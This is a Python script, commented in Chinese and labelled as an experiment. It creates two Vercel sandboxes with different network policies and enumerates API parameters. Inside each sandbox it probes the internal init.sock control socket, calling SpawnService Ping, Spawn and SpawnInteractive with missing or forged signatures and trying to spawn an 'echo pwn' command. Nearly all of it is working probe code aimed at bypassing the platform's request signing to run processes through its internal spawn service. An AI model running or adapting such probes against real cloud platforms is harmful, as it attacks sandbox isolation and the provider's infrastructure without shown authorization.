# 实验J101: 双沙箱对照 — 默认 policy vs custom policy 的 init.sock 服务差异 + API project 参数枚举
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def create(name, policy=None):
    body = {"projectId": PROJ, "name": name}
    if policy is not None:
        body["networkPolicy"] = policy
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}", body)
    if c != 200:
        print(f"create {name} FAIL {c}: {r[:300]}", flush=True)
        return None
    return json.loads(r)["sandbox"]["currentSessionId"]

# --- [A] API 枚举端点参数名修正 ---
print("== [A] GET /v2/sandboxes?project= 参数变体 ==", flush=True)
for q in [f"teamId={TEAM}&project={PROJ}",
          f"teamId={TEAM}&project={PROJ}&projectId={PROJ}",
          f"teamId={TEAM}&projectId={PROJ}&project={PROJ}"]:
    c, r = api("GET", f"/v2/sandboxes?{q}")
    print(f"  [{q.split('&')[1][:30]}] {c}: {r[:400]}", flush=True)
    time.sleep(0.5)

# --- [B] 双沙箱对照 ---
print("\n== [B] 创建 默认policy vs custom-policy 沙箱 ==", flush=True)
SID_DEF = create("expj101def")
SID_CUS = create("expj101cus", {"mode": "custom", "allowedDomains": ["httpbin.org"]})
print("def:", SID_DEF, "cus:", SID_CUS, flush=True)

PROBE = r"""
import subprocess, base64, time, struct, json

SIG = base64.b64encode(b"\x99" * 64).decode()
TS = str(int(time.time() * 1000))

def frame(body):
    return b"\x00" + struct.pack(">I", len(body)) + body

def probe(path, ctype, body, sig=None):
    cmd = ["curl", "-sS", "-m", "6", "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + TS]
    if sig is not None:
        cmd += ["-H", "x-signature: " + sig]
    cmd += ["--data-binary", "@-", "http://localhost" + path]
    try:
        r = subprocess.run(cmd, input=body, capture_output=True, timeout=10)
        return (r.stdout + r.stderr).decode(errors="replace")[:220].replace("\r\n", " | ")
    except Exception as e:
        return f"EXC({e})"

CASES = [
    ("Ping-nosig", "/vercel.sandbox.spawn.v1.SpawnService/Ping", "application/connect+json", frame(b"{}"), None),
    ("Ping-sig",   "/vercel.sandbox.spawn.v1.SpawnService/Ping", "application/connect+json", frame(b"{}"), SIG),
    ("Spawn-nosig", "/vercel.sandbox.spawn.v1.SpawnService/Spawn", "application/connect+json",
     frame(json.dumps({"command": "echo", "arguments": ["pwn"]}).encode()), None),
    ("Spawn-sig", "/vercel.sandbox.spawn.v1.SpawnService/Spawn", "application/connect+json",
     frame(json.dumps({"command": "echo", "arguments": ["pwn"]}).encode()), SIG),
    ("Interactive-nosig", "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", "application/connect+json", frame(b"{}"), None),
    ("Interactive-sig", "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", "application/connect+json", frame(b"{}"), SIG),
    ("Interactive-grpc", "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive", "application/grpc+json", frame(b"{}"), SIG),
    ("Ping-rawbody", "/vercel.sandbox.spawn.v1.SpawnService/Ping", "application/connect+json", b"{}", None),
]

for label, path, ctype, body, sig in CASES:
    print(f"[{label}] -> {probe(path, ctype, body, sig)}", flush=True)
"""
for sid, tag in [(SID_DEF, "DEFAULT"), (SID_CUS, "CUSTOM")]:
    print(f"\n########## {tag} ##########", flush=True)
    run_cmd(sid, PROBE, tag.lower(), wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/expj101def?teamId={TEAM}&projectId={PROJ}")
api("DELETE", f"/v2/sandboxes/expj101cus?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
